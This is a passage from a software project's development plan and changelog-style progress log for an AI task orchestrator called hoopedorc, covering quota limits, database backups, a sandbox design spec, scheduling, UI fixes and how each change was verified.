behavior in isolation. The `"timeout"` path is covered by the fake-GitService
unit test only (precise real-world timing control wasn't practical to
reproduce safely). `npm run typecheck`/`npm run build` green across all
workspaces.

F16 fixed: new optional `ModelConfig.quota: { windowHours, maxRuns?,
maxCostUsd? }` declares a subscription's rolling usage window (Claude Pro's
cap being the motivating case); `PUT /api/settings` rejects a quota with a
non-positive `windowHours`, neither `maxRuns` nor `maxCostUsd` set, or a
non-positive limit. New `repo.getModelUsageSince(db, model, sinceIso)`
counts `runs` rows (every attempt, not just terminal ones — a subscription
window cares about requests made) and sums `costs` rows for a model since a
timestamp, across ALL projects (mirroring `getModelMonthlyCost`'s
cross-project reasoning, just with a rolling window instead of a calendar
month). New `budget.ts` function `checkModelQuota(db, model, settings)`
computes the window's cutoff from `quota.windowHours` and returns a reason
once either limit is met. Wired into `EngineRunner.buildOrchestrator` as a
direct lambda (`checkModelQuota: (modelId) => checkModelQuota(this.db,
modelId, settings)`) — a deliberate deviation from the plan's literal
wording ("`EngineRunner.checkModelQuota(modelId)`"): no internal state is
needed (unlike F6's cooldown Map), so it mirrors `checkBudget`'s existing
direct-lambda wiring rather than adding a redundant wrapper method, the
same kind of simplification F9 made for its own `SchedulerDeps` field.
New `SchedulerDeps.checkModelQuota?` hook consulted at **both** places
`checkBudget` already is: the dispatch loop (skip-don't-fail, new
`quotaBlockedWarned` Set following the exact
budget/cooldown/capacity warn-once pattern including the `.clear()`/
`.delete()` calls) and the retry/attempt path (requeue-to-backlog,
mirroring `checkBudget`'s own retry-path shape exactly, including that it
is **not** warn-once there — matching how the existing budget check
behaves at that site too). New checkbox-adjacent three-input row (window
hours / max runs / max cost) in `ModelsEditor.tsx` per model. Verified: new
engine unit test proves the warn fires exactly once across several polls
while a *different* task keeps the loop alive (not just trivially once,
which the naive first draft of this test would have shown regardless of
the dedup logic — a plain single-task version couldn't distinguish "warned
once" from "the loop only ever runs one pass," since budget/cooldown/quota
blocks don't set the `blockedByCapacity` flag that keeps `start()`'s loop
polling, unlike F12/B18's capacity check) — 32/32 engine tests green (1
new). Server-side: a standalone script against a real in-memory SQLite DB
(seeded via the actual `repo.createProject`/`createTask`/`createRun`/
`createCost` functions, not raw SQL) confirmed the real `checkModelQuota` +
`getModelUsageSince` window math for all four cases the plan asked for —
runs-limit reached, cost-limit under then over, and no-quota-configured —
plus an explicit assertion that out-of-window rows are excluded from the
count. Also live-verified `PUT /api/settings`'s new validation against a
real running server: a quota with a window but no limit → 400 with a clear
message; a valid quota → 200 and round-trips; a negative `maxRuns` → 400.
`npm run typecheck`/`npm run build` green across all workspaces.

F17 fixed: new `packages/server/src/db/backup.ts` — `runBackup(db, dbPath,
backupDir, keep)` uses better-sqlite3's own online-backup API
(`db.backup(destPath)`, confirmed as a real `Promise`-returning method by
reading the installed v11.10.0's actual implementation in
`node_modules/better-sqlite3/lib/methods/backup.js` before writing any
code, per the plan's explicit instruction — it also revealed a real
constraint worth knowing: the destination *directory* must already exist
or `db.backup()` throws, so `runBackup` `mkdirSync`s it first). Filenames
are `hoopedorc-YYYY-MM-DD-HHmm.db`; prunes to the newest `keep` afterward
by `mtime`. Skips entirely (no directory even created) when `dbPath` is
literally `":memory:"` — the caller in `main()` passes
`ENV.mock ? ":memory:" : ENV.dbPath`, matching exactly what `setupDb()`
itself used to open the DB. Wired into `main()` right next to the existing
log-pruning code, same on-boot-plus-daily `setInterval(...).unref()`
pattern, wrapped in a `.catch()` that only logs a warning — a failed
backup must never crash the server. New `DB_BACKUP_DIR` (default:
`<dirname(dbPath)>/backups`, computed once in `config.ts` alongside
`dbPath` itself so the default doesn't need recomputing at call sites) and
`DB_BACKUP_KEEP` (default 7) env vars, added to `.env.example`. Verified
against the real implementation two ways: (1) a standalone script against
a real file-based `better-sqlite3` DB (via `initDb`, not a reimplementation)
covering all three acceptance scenarios — a real backup file appears
matching the exact filename pattern; pre-seeding 9 dummy older files then
backing up again prunes to exactly 7 with the newest (including the
just-created real backup) surviving; an in-memory DB backup is skipped
with no directory created at all; (2) booted the actual built server
(non-mock, a real file DB) fresh and confirmed via its own log line and a
real `sqlite3 .tables` read against the produced file that a genuine,
schema-intact backup was written on boot. `npm run typecheck`/
`npm run build` green across all workspaces; `npm test -w @orc/engine`
(32/32) and `-w @orc/adapters` (4/4) unaffected (no engine/adapter changes).

F18 fixed: new `docs/specs/sandbox.md` — goals/non-goals, the
authenticated-CLIs-in-a-container problem (leads with F10's Keychain
finding: Claude Code's login lives in the macOS Keychain, unreachable from
a Linux container, so `ANTHROPIC_API_KEY` — billed per-token via the
Console, not a subscription's flat rate — is the only container-compatible
path for Claude; `opencode`'s file-based auth and `gh`'s native `GH_TOKEN`
support are more container-friendly, `GH_TOKEN`/`GITHUB_TOKEN` support
confirmed directly via `gh help environment` before writing it down), the
worktree mount model (bind-mount exactly `task.worktreePath`, nothing else
from the host — closing the current gap that nothing actually enforces
"one task can only touch its own worktree" beyond convention), a network
allowlist policy (target-repo host, the assigned model's specific
provider endpoint, and — a real tension worth flagging — package-registry
access for gate scripts that install deps at run time, so "no network at
all" doesn't cleanly work for the gates stage), env sanitization as two
layers (S5's existing host-side `sanitizedEnv()` denylist, plus a stricter
container-side allowlist built from scratch rather than forwarded from the
host), why gates are the easier half to containerize first (no CLI-auth
problem at all — plain `npm`/`execFile` calls), and a three-phase rollout
(gates-only → agents opt-in per model, starting with `opencode`'s simpler
auth story → agents default-on). Linked from F13's plan entry and from
`README.md`'s Security section, per the acceptance criteria. **No
implementation** — F13 remains future work; this is design only.

F19 fixed (last item — **closes Part 3 and the entire productization
plan**): new `ProjectConfig.schedule` (`ProjectSchedule`) — deliberately
simple cron-style auto-start, not real cron syntax, matching the plan's own
"deliberately dumb" framing: `enabled` + `mode: "interval" | "daily"`,
where `"interval"` needs `intervalHours` (1–720) and `"daily"` needs `hour`
(0–23)/`minute` (0–59) on the server's local clock. Validated on
`PATCH /api/projects/:id` the same way F15/F16 validate their own
`ProjectConfig` additions. New pure `packages/server/src/scheduler.ts`
`isScheduleDue(schedule, lastRunAt, now)` — kept as a standalone,
DB-free function so the date math is testable without booting a server;
"interval" fires once `now - lastRunAt >= intervalHours`, or immediately if
never run; "daily" fires only during the exact HH:MM minute *and* only
once per calendar day (guards against firing every poll during that
minute, or twice if the server restarts within it). New top-level
`Project.lastScheduledRunAt` (a real DB column via the standard `ALTER
TABLE` migration, deliberately **not** part of the `config` JSON blob a
Settings-style save would round-trip wholesale) tracks when the scheduler
last actually kicked off a run — kept as its own field specifically so a
human editing the schedule in the Advanced accordion and the scheduler's
own background write can never race each other. A new `setInterval` in
`main()` (~60s — fine enough resolution for HH:MM precision) iterates
every project, calls the existing `EngineRunner.start()` — the exact same
call the UI's Start button makes, no new dispatch mechanism — and only
stamps `lastScheduledRunAt` on an actual successful kickoff (`engine.start()`
throwing, e.g. a manual dispatch is in flight, doesn't consume the
schedule slot, so the next ~60s check retries instead of silently losing
that cycle until the next full interval/day). New Advanced-accordion
controls (`ProjectConfigFields.tsx`) — enable checkbox, a mode select,
and the relevant inputs. Verified: a standalone script exercising the real
`isScheduleDue` directly covered 13 cases (disabled/undefined schedules,
interval under/at/over its window plus a never-run-yet immediate-due case
plus an invalid-zero-hours case, and daily's exact-minute/wrong-minute/
wrong-hour/already-fired-today/fired-yesterday/missing-config cases) — all
passed. Live-verified end-to-end against a real running server: invalid
schedule configs (missing `hour`, a bad `mode`, an out-of-range
`intervalHours`) all correctly 400; a valid daily schedule round-trips
through `PATCH`; and — the real integration point — a throwaway project
(pointed at a nonexistent repo URL and an isolated scratch directory, kept
deliberately separate from anything that could touch this actual repo or
spend real model cost) with an immediately-due interval schedule was
picked up by the real ~60s scheduler tick, logged `"scheduled start:
<name>"`, and had `lastScheduledRunAt` populated — confirming the
scheduler genuinely calls the production `engine.start()` path, not a
reimplementation. `npm run typecheck`/`npm run build` green across all
workspaces; `npm test -w @orc/engine` (32/32) and `-w @orc/adapters` (4/4)
unaffected (no engine/adapter changes).

**This closes out Phase 8 — every item in Parts 1, 2, and 3 of this plan
(S1-S6, B1-B19, F1-F19) is now done.**

### Phase 9 — Part 4: post-plan audit fixes + UX wave — ✅ DONE

| Item | Status | PR |
|---|---|---|
| A1 — concurrent 401s hang api() calls (TokenGate resolver clobbered) | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A2 — scheduled runs never showed status "running" / no WS broadcast | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A3 — daily schedules could silently skip a day (poll drift) | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A4 — CHANGELOG had no 0.2.0 / Phase 7–8 entries | ✅ done | [#58](https://github.com/IngeniousArtist/hoopedorc/pull/58) |
| A5 — USER_GUIDE didn't cover quota/schedules/checks-gate/backups | ✅ done | [#58](https://github.com/IngeniousArtist/hoopedorc/pull/58) |
| U1 — no global "action required" indicator in the nav | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U2 — full ProjectHeader repeats on every project page | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U3 — Board's 8 columns overflow with no affordance | ✅ done | [#60](https://github.com/IngeniousArtist/hoopedorc/pull/60) |
| U4 — switching tabs silently discards unsaved Settings edits | ✅ done | [#61](https://github.com/IngeniousArtist/hoopedorc/pull/61) |
| U5 — MissionControl elapsed label reads "42s ago elapsed" | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U6 — model-reassign dropdown on every kanban card | ✅ done | [#62](https://github.com/IngeniousArtist/hoopedorc/pull/62) |
| U7 — schedules invisible outside the Advanced accordion; disable loses times | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U8 — headline costs render as "$0.0000" | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U9 — "New Project" is a nav tab though it's an action | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U10 — dependency chips truncate with no way to see the full title | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |

A1–A3 were found by Fable's post-Phase-8 audit and fixed the same day (see
Part 4 below for the record); A4/A5 were fixed alongside Part 4 itself in
the docs PR that also restored this doc's accidentally-deleted "Part 1"
heading and overhauled the README. U1–U10 are the next implementation wave
— same workflow as every prior phase, work top-down. Split into two
batches (mirroring Phase 3's pattern): batch 1 (U1, U2, U5, U7, U8, U9 —
✅ done, PR #59; U10 needed no code change, already fixed) shipped the
lower-risk items; batch 2 (U3 — ✅ done, PR #60; U4 — ✅ done, PR #61; U6 —
✅ done, PR #62) shipped the remaining ones with more interaction-state
complexity: Board column collapse/dragover, cross-component Settings dirty
tracking, moving the model-reassign control. **This closes out the entire
U1–U10 UX wave and Part 4 of the plan.**

U3 (PR #60) fixed: `Board.tsx` now tracks `expandedEmpty` (a
`Set<TaskStatus>` of columns a click or a drag has explicitly opened) and
`dragOverStatus` (the column currently being dragged over, if any). A
column collapses to a `w-9` vertical strip — rotated label + a "0" count
badge via `[writing-mode:vertical-rl] rotate-180` — whenever it has zero
tasks *and* isn't in either of those two sets; a column with any tasks is
never collapsed, full stop, regardless of set membership (so a column that
was manually opened while empty and then received a card can't glitch back
into a collapsed state later just because the set still has its status).
Clicking a collapsed strip — or its expanded-but-still-empty header, which
toggles the same way — flips its membership in `expandedEmpty`; dragging
over a collapsed strip sets `dragOverStatus` to that column, which swaps it
to the full expanded `<section>` in the same spot (same drop handler,
already attached) so the drop completes normally, then clears
`dragOverStatus` on drop/dragleave. Deliberately did not reorder columns
(collapsed ones stay in their original `TASK_STATUSES` position) or add any
new drag-and-drop mechanism — this only decides which of the two existing
render branches (slim strip vs. full section) a column takes. Verified:
`npm run typecheck`/`npm run build` green across all workspaces; `npm test
-w @orc/engine` (32/32) and `-w @orc/adapters` (4/4) unaffected (no
engine/adapter/server changes). Live-verified against `npm run mock`'s own
seed (the exact scenario the acceptance criteria names): at a 1280px
viewport, all 8 columns render with zero horizontal scroll — Backlog,
Ready, In Progress, and In Review expanded per the seed's 4 non-empty
statuses, Changes Req./Blocked/Done/Failed collapsed to strips. Click-to-
expand and click-to-recollapse both confirmed on the Blocked strip. The
drag-onto-collapsed-column path needed care to verify properly: Chrome's
native mouse-drag simulation doesn't reliably fire real HTML5 `dragstart`/
`dragover`/`drop` events, so it was tested by dispatching genuine
`DragEvent`s with a shared `DataTransfer` directly at the DOM nodes
(`element.dispatchEvent(new DragEvent(...))`) — the same technique used for
automated HTML5 drag-and-drop testing generally, and it exercises the
app's real bound handlers, not a reimplementation. This caught a bug in the
*test script* itself on the first attempt (dispatching `drop` on a stale
reference to the now-unmounted collapsed `<button>`, since it had already
swapped to the expanded `<section>` on `dragover` — fixed by re-querying
the live element before the `drop` dispatch) and separately surfaced two
pre-existing, unrelated server rules while picking test fixtures: B5's PATCH
validation only allows a manual drag to requeue a task to `backlog` or
`ready` (every other status is engine-assigned, confirmed via
`packages/server/src/index.ts`'s `"PATCH can only requeue a task to
\"backlog\" or \"ready\""` 400), and a task that's `in_progress`/`in_review`
rejects any PATCH with 409 (must Stop it first) — neither is new behavior,
both were hit incidentally when the first two test picks (an in-progress
task, then a backlog→changes_requested attempt) 409'd/400'd for reasons
having nothing to do with collapse. The clean, unambiguous proof came from
emptying Backlog by moving its one task to Ready (a valid transition,
succeeded 200), confirming Backlog auto-collapsed, then dragging a Ready
task onto the now-collapsed Backlog strip and confirming a 200 PATCH plus
the card actually landing in the (now re-expanded) Backlog column.

U4 (PR #61) fixed: `Settings.tsx` already tracked its own `dirty` boolean
(set on every field mutation, cleared on save) — U4 just needed it exposed
before the component unmounts, since `App.tsx`'s
`{page === "settings" && <Settings />}` destroys it on tab switch. New
`onDirtyChange?: (dirty: boolean) => void` prop, reported via a
`useEffect(() => onDirtyChange?.(dirty), [dirty, onDirtyChange])` — a plain
prop-drilled callback into a `useRef` in `App.tsx` (not `Settings` module
state, since a ref update must never itself trigger a re-render of `App`).
New `navigate(next: Page)` in `App.tsx` wraps every reachable-from-Settings
`setPage` call (the `NAV` tab buttons and the top-row "+ New" button —
traced every other `setPage` call site in the file and confirmed none of
the others can fire while `page === "settings"`, e.g. the empty-state "New
Project" button only renders for `PROJECT_PAGES`, which excludes Settings):
`if (page === "settings" && settingsDirtyRef.current && !window.confirm(...))
return;` else `setPage(next)`. Also made the Save row `sticky bottom-0`
(previously just the last element of a long, tall form) so it — and the
"Unsaved changes" hint next to it — stay in view on any viewport height
without scrolling. Verified: `npm run typecheck`/`npm run build` green
across all workspaces; `npm test -w @orc/engine` (32/32) and `-w
@orc/adapters` (4/4) unaffected (no engine/adapter/server changes).
Live-verified against `npm run mock` — a real native `window.confirm`
dialog would hang the browser-automation session per its own tool
guidance, so rather than skip verification, `window.confirm` was
temporarily stubbed via script (a standard technique for testing code that
calls blocking dialogs) while real clicks/inputs still drove the UI: toggled
a model's role checkbox to dirty the form, clicked the Board nav tab with
`confirm` stubbed to return `false` — confirmed it was called with the
exact string `"Discard unsaved settings changes?"` and that Settings
stayed mounted with the edit intact; retried with `confirm` stubbed to
return `true` — confirmed it navigated to Board (Settings' own heading gone
from the DOM); saved the edit, then clicked Board again with `confirm`
stubbed to spy-only — confirmed it was **never called** and navigation
happened immediately (the "save → switch is silent" case). Also confirmed
visually at a real 1280×800 window: the Save button and "Unsaved changes"
hint are both visible pinned to the bottom of the viewport on the initial
Settings load, with no scrolling needed, even though the full form (Models,
Routing, Merge Policy, Risky Rules, Projects, Security, Budget, Browser
Notifications, Telegram) is far taller than 800px.

U6 (PR #62) fixed: `TaskCard.tsx` dropped its `<ModelSelect>` entirely
(along with the now-unused `onModelChange` prop and `ModelId` import) —
the card's existing static chip (previously the raw `task.assignedModel`
id, e.g. `"deepseek-pro"`) now resolves the display name via `models`
(`models.find((m) => m.id === task.assignedModel)?.displayName ??
task.assignedModel`), matching how MissionControl already shows its
active-agent chips. Reassignment moved to `TaskDrawer`'s Overview tab: a
new required `onModelChange: (m: ModelId) => void` prop, wired through the
same `ModelSelect` component TaskCard used to render, with the *exact*
same enable/disable rule TaskCard enforced
(`disabled={task.status === "in_progress" || task.status === "in_review"}`,
same `disabledReason` copy) — a straight move, not a reimplementation.
`Board.tsx` now passes `onModelChange` to `TaskDrawer` instead of each
`TaskCard`, reusing the same pre-existing `handleModelChange(taskId,
model)` handler unchanged. Verified: `npm run typecheck`/`npm run build`
green across all workspaces; `npm test -w @orc/engine` (32/32) and `-w
@orc/adapters` (4/4) unaffected (no engine/adapter/server changes).
Live-verified against `npm run mock`: cards across Backlog/Ready/In
Progress/In Review all show a plain chip with the friendly model name and
no dropdown at all; opened the drawer for a Ready (non-active) task and
reassigned it from "Deepseek v4 Pro" to "GLM 5.1" via the drawer's select —
confirmed both the drawer's own "Roles: …" caption updated and, without
closing the drawer, the *card itself* live-updated its chip to "GLM 5.1"
(no reload); opened the drawer for an in_progress task and confirmed via
direct DOM inspection (`select.disabled === true`) that the control is
genuinely disabled, showing the current model and the "Running — wait for
this attempt to finish to reassign" message, not just visually similar.

Batch 1 (PR #59) fixed: **U1** — new amber count badge on the
Notifications nav item (`App.tsx`) for notifications with
`requiresApproval` and no `respondedWith`; seeded once from
`GET /api/notifications` on mount, kept live off the same global
`notification` WS broadcast B15 already made reach every client regardless
of subscribed project (the handler now always upserts into a `notifications`
array — mirroring `Notifications.tsx`'s own WS reducer exactly — and only
conditionally fires the existing browser-notify call on `action_required`).
**U2** — `ProjectHeader` takes a `compact?: boolean` prop that skips the
budget editor and the Advanced accordion, rendering just the top row (name,
repo, status chip, schedule chip, Start/Pause/Stop); `App.tsx` passes
`compact={page !== "board"}`. **U5** — one-line fix in `MissionControl.tsx`:
strips the " ago" suffix off the reused `agoLabel()` output instead of
appending "elapsed" after it, so an active row reads "elapsed 2m 3s" instead
of "2m 3s ago elapsed" — `TaskCard.tsx`'s own `agoLabel` usage is untouched.
**U7** — new `formatSchedule()` helper renders the "⏱ daily 03:15" / "⏱
every 6h" chip on both ProjectHeader variants and the ProjectsView row;
separately, `projectConfigFromForm` no longer drops the whole `schedule`
object when the enable checkbox is off — it now emits
`{ enabled: false, ...times }` whenever the hour/minute or interval fields
are filled in, so disabling and saving no longer discards them (the
scheduler's `isScheduleDue` already checks `enabled` first, so a persisted
disabled schedule is inert). Live-verified the exact round-trip the bug
described: toggle off → save → reload the page → re-check "enabled" →
the same hour/minute reappear instead of blank inputs (confirmed via curl
that the server actually persisted `{enabled:false, hour:3, minute:15}`,
not an omitted field). **U8** — new shared `formatUsd()`
(`apps/web/src/lib/format.ts`): `>= $0.01` → 2 decimals, `> 0 and < $0.01`
→ 4 decimals, `0` → "$0.00"; applied only to the two headline spots the
plan named (CostView's "Total spend" tile, BoardSummary's "spent" line) —
per-task/per-run rows (CostView's "By task"/"By model", the avg-cost
caption) deliberately keep their existing 4-decimal `usd()` formatting.
**U9** — `new-project` removed from `App.tsx`'s `NAV` array (now 8 tabs);
a "+ New" button sits next to the project selector in the top row instead,
plus a visual divider between the project-scoped tabs (Board…Notifications)
and the global ones (Projects/Settings/Setup) — computed from
`PROJECT_PAGES` rather than a hardcoded index so the two lists can't drift
apart. **U10** — turned out to already be fixed: `TaskCard.tsx`'s
dependency chip has carried `title={dep.title}` since the F3/F4 era: no
code change, confirmed via a DOM inspection (`el.title`) since native OS
tooltips don't render in CDP screenshots.

All six live-verified together against one real (non-mock) server process,
seeded via the actual `repo.ts` functions (`createProject`/`createTask`/
`createCost`/`createNotification` — not raw SQL) into a scratch SQLite DB:
one project with an enabled daily schedule, a running task, a task blocked
on it (for U10's tooltip), and two notifications inserted *after* boot
specifically to dodge B10's boot-time `expireStaleApprovals` sweep (seeding
them before boot would have stamped them `expired_restart` before the badge
could ever see them as pending); a second project with real cost records
($1.23 + $0.0034) for U8's two precision tiers. `npm run typecheck` /
`npm run build` green across every workspace; `npm test -w @orc/engine`
(32/32) and `-w @orc/adapters` (4/4) unaffected — no engine/adapter code
touched this batch. One thing deliberately **not** live-verified: the
badge's WS-driven live decrement when a notification is actually responded
to. That requires a genuine in-flight engine approval (a real
`EngineRunner.pendingApprovals` resolver, private to the running server
process) — fabricating one safely was out of proportion for a UI-polish
batch, so this was reasoned from code instead: `respondNotification`'s
success path already broadcasts the updated notification globally (used and
verified since B15/F5), and the badge's handler is the same upsert-by-id
reducer `Notifications.tsx` has used and relied on since F5.

### Phase 10 — Part 5: post-UX-wave fixes + remote-QoL wave — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B20 — Projects-page "Pause" is an unconfirmed hard abort | ✅ done | [#64](https://github.com/IngeniousArtist/hoopedorc/pull/64) |
| S7 — API token written to server logs via the WS query param | ✅ done | [#65](https://github.com/IngeniousArtist/hoopedorc/pull/65) |
| B21 — Board drag-and-drop failures are silent | ✅ done | [#64](https://github.com/IngeniousArtist/hoopedorc/pull/64) |
| B22 — Schedule form can silently delete a saved schedule | ✅ done | [#66](https://github.com/IngeniousArtist/hoopedorc/pull/66) |
| B23 — `notifications` table grows unbounded | ✅ done | [#67](https://github.com/IngeniousArtist/hoopedorc/pull/67) |
| B24 — Browser-notification dead ends are silent | ✅ done | [#67](https://github.com/IngeniousArtist/hoopedorc/pull/67) |
| F20 — Remote setup docs: `tailscale serve` HTTPS + EC2 headless auth | ✅ done | [#69](https://github.com/IngeniousArtist/hoopedorc/pull/69) |
| F21 — Hash routing + deep links | ✅ done | [#70](https://github.com/IngeniousArtist/hoopedorc/pull/70) |
| F22 — Approval context (PR link + reasons) in the web UI | ✅ done | [#71](https://github.com/IngeniousArtist/hoopedorc/pull/71) |
| F23 — Global "Stop all" control | ✅ done | [#72](https://github.com/IngeniousArtist/hoopedorc/pull/72) |
| F24 — Update story: `scripts/update.sh` + version surfacing | ✅ done | [#73](https://github.com/IngeniousArtist/hoopedorc/pull/73) |
| U11 — No `beforeunload` guard while Settings is dirty | ✅ done | [#74](https://github.com/IngeniousArtist/hoopedorc/pull/74) |
| U12 — `agoLabel` has no hours unit | ✅ done | [#74](https://github.com/IngeniousArtist/hoopedorc/pull/74) |
| U13 — MissionControl "elapsed" resets on status transitions | ✅ done | [#74](https://github.com/IngeniousArtist/hoopedorc/pull/74) |
| U14 — Notifications page: pending approvals should sort first | ✅ done | [#74](https://github.com/IngeniousArtist/hoopedorc/pull/74) |
| F25 — Single shared WebSocket connection | ✅ done | [#75](https://github.com/IngeniousArtist/hoopedorc/pull/75) |
| F26 — PWA manifest | ✅ done | [#76](https://github.com/IngeniousArtist/hoopedorc/pull/76) |

Worked top-down in the suggested batches, mirroring Phases 3/9: (1) B20+B21;
(2) S7; (3) B22; (4) B23+B24 — the "fixes first" set, recorded above; (5) F20
(docs only); (6) F21; (7) F22; (8) F23; (9) F24; (10) U11–U14 together;
(11) F25; (12) F26. **This closes out Part 5 and Phase 10.**

F20–F26 notable finds/decisions (each fully live-verified against real
running processes/browsers — see each PR description for the specific
evidence):
- **F20** (docs only): `tailscale` isn't installed in this dev environment,
  so its exact invocation is written from official docs and explicitly
  marked "verify on your box" rather than asserted as tested — everything
  about the three CLI auth flows *was* verified against the actually
  installed tools. Found `claude setup-token` via `--help` inspection — a
  headless-friendly, subscription-billed (not pay-per-token) auth path
  worth knowing about that wasn't previously documented anywhere in this repo.
- **F21**: hash sync is a plain `useEffect` reacting to `(page,
  selectedProjectId)` rather than threading a hash-write through every
  `setPage` call site — the first write uses `replaceState` (no phantom
  back-entry for a fresh install), every later one `pushState`s. The
  Settings-dirty guard's cancel path explicitly re-pushes the hash back to
  the current page, since a `hashchange` (unlike a click) has already moved
  `location.hash` by the time the handler runs.
- **F22**: `EngineRunner.requestApproval` now computes the PR URL + latest
  validator reasons once and feeds both the persisted notification and the
  Telegram message from that one source. Mock seed gained a permanent
  pending-approval-with-context example, seeded *after* the boot-time
  `expireStaleApprovals` sweep (not inside `setupDb()`) — that sweep runs
  unconditionally on every boot and would otherwise stamp a freshly-seeded
  pending approval `expired_restart` before anyone saw it live.
- **F23**: `EngineRunner.stopAll` hard-aborts the autonomous loop *and*
  separately walks `manualRuns` for in-flight manual dispatches — pause()
  alone never touches that second, distinct execution path (B19). Writes
  one audit entry *per* affected project rather than a single global one,
  since `AuditEntry.projectId` is required and the Audit tab is per-project.
  Multi-simultaneous-project stopping was verified by code review only —
  reliably standing up two independently-registered real orchestrators
  wasn't practical to reproduce safely in this pass (each needs its own
  genuine Start, and a project with no tasks yet winds down its dispatch
  loop almost immediately).
- **F24**: found and fixed two real, independent bugs while wiring this up
  — root `package.json`'s `version` had drifted to `"0.1.0"` despite
  `CHANGELOG.md`/git tags already at `v0.2.0` (bumped to match, otherwise
  the new version-surfacing feature would report something false), and
  `scripts/update.sh`'s first draft threw `unbound variable` specifically
  on **macOS's default Bash 3.2** (`set -u` + empty-array expansion — fixed
  in 4.4+) — caught only by actually running the script end-to-end in an
  isolated scratch clone, not by `bash -n` alone.
- **U11–U14**: batched together as one PR (all small, independent UI
  fixes). U13's specific `in_progress → in_review` transition couldn't be
  live-reproduced in this environment — every real author attempt here
  fails authentication/network near-instantly, so tasks never reach the
  gates stage where that transition happens; verified by code review
  instead (the new `activeSince` tracking mirrors the already-proven
  `activity` heartbeat map exactly).
- **F25**: live-verified against the real **production build** specifically
  (not the Vite dev server) to avoid React StrictMode's dev-only
  double-invoke noise muddying the connection count — confirmed exactly
  one `/ws` request for the whole Board view (App+Board+MissionControl
  together) and exactly one reconnection after killing and restarting the
  server.
- **F26**: manifest + two PNG icons (a `blue-600` "H" monogram on
  `neutral-950`, matching the app's own existing palette) generated by hand
  via `zlib.deflateSync` + manual PNG chunk framing rather than adding an
  image-processing dependency for two static icons. Deliberately no service
  worker (out of scope for this item) — noted that Chrome's automatic
  install banner typically also wants one, so "Add to Home Screen" here may
  need the browser's manual menu action rather than an automatic prompt.

**This closes out Part 5 (Phase 10) — every item in Parts 1–5 of this plan
is now done.**

**"Fixes first" batch (B20–B24, S7) — ✅ DONE**, all four PRs merged;
`npm run typecheck`, `npm run build` green across all workspaces on every
merge; `npm test -w @orc/engine` (32/32) and `-w @orc/adapters` (4/4)
unaffected throughout (no engine/adapter changes in this batch — all
web/server). Every item was live-verified against a real running
process/browser, not just typechecked — see each PR's description for the
specific evidence. Notable finds/decisions:
- B20+B21 (PR #64): B20's fix was verified by stubbing `window.fetch` and
  `window.confirm` in a real browser session (not just reading the code) —
  confirmed Pause genuinely sends `{drain:true}` with no confirm dialog, and
  Stop now shows the exact confirm copy and only sends `{drain:false}` on
  acceptance. B21 was verified by dispatching real `DragEvent`s (U3's
  technique) for both a rejected move (toast shows the server's actual 400
  message) and a valid one (silent, task genuinely updates server-side).
- S7 (PR #65): live-verified against the real *built* server (not the mock),
  since the mock server's simplified paths aren't representative of what
  actually ships to production logs — booted with a real `API_TOKEN`,
  connected a real WebSocket with the token in the query string via Node's
  native `WebSocket`, and confirmed via `grep -c` on the log file that the
  real token string appears zero times, while the redacted line reads
  `/ws?token=[redacted]`.
- B22 (PR #66): the fix needed a third state beyond "no schedule" / "valid
  schedule" — a `projectConfigFormError()` helper distinguishes "the user
  hasn't touched schedule fields at all" (fine, clears the schedule) from
  "some sign of intent but incomplete for the current mode" (blocks save).
  Live-verified both trigger paths that motivated the bug: blanking one of
  two paired fields (daily's hour/minute), and switching the mode dropdown
  when the new mode's own field is empty — both disable Save with a visible
  reason and leave the previously stored schedule untouched, confirmed via a
  live `GET` after each blocked-save attempt.
- B23+B24 (PR #67): B23's boot-time integration test surfaced a genuine,
  correct interaction with B10 worth recording — an old *pending* approval
  seeded before boot gets converted to `expired_restart` by B10's unrelated
  boot-time sweep before B23's pruning ever runs, so it becomes fair game
  for age-based pruning like any other resolved notification (this is
  correct: B23's "never prune a pending approval" guarantee is precise and
  was proven directly against `pruneNotifications()` with a *live* pending
  approval, decoupled from B10's boot semantics, in a separate standalone
  script). B24's Android-throws-on-construction path was live-verified by
  substituting a fake `window.Notification` class whose constructor throws
  — confirmed the new amber warning renders, then repeated with a
  succeeding fake to confirm the ordinary green "Enabled." path still
  works unchanged.

### Phase 11 — Part 6: owner-requested QoL wave + audit fixes — 🔶 IN PROGRESS

| Item | Status | PR |
|---|---|---|
| B25 — USER_GUIDE's `tailscale serve` example uses the wrong port | ✅ done | [#79](https://github.com/IngeniousArtist/hoopedorc/pull/79) |
| B26 — old pending approvals can fall off the notification fetch | ✅ done | [#79](https://github.com/IngeniousArtist/hoopedorc/pull/79) |
| B27 — `update.sh` systemd-unit detection is version-fragile | ✅ done | [#79](https://github.com/IngeniousArtist/hoopedorc/pull/79) |
| T1 — real `@orc/server` test package | ✅ done | [#80](https://github.com/IngeniousArtist/hoopedorc/pull/80) |
| F27 — plan-mode attachments (images/PDF/files → project context folder) | ✅ done | [#81](https://github.com/IngeniousArtist/hoopedorc/pull/81) |
| F28 — plan-chat history archived as markdown session files | ✅ done | [#81](https://github.com/IngeniousArtist/hoopedorc/pull/81) |
| F31 — engineering guidelines (coding/UX/security) in author+validator prompts | ✅ done | [#82](https://github.com/IngeniousArtist/hoopedorc/pull/82) |
| F29 — documentation guidelines for the docs-role model | ✅ done | [#83](https://github.com/IngeniousArtist/hoopedorc/pull/83) |
| F30 — per-task documentation stage in the merge pipeline | ⬜ | |
| F32 — rate-limit wait-and-retry + fallback alerts on Telegram | ⬜ | |
| F33 — model test round-trip shows the model's own reply | ⬜ | |
| F34 — skills strategy: docs + per-project skill hints in prompts | ⬜ | |
| F35 — quota usage in the Setup health panel | ⬜ | |

Work top-down in the suggested batches: (1) B25–B27 together; (2) T1;
(3) F27+F28; (4) F31; (5) F29; (6) F30; (7) F32; (8) F33; (9) F34;
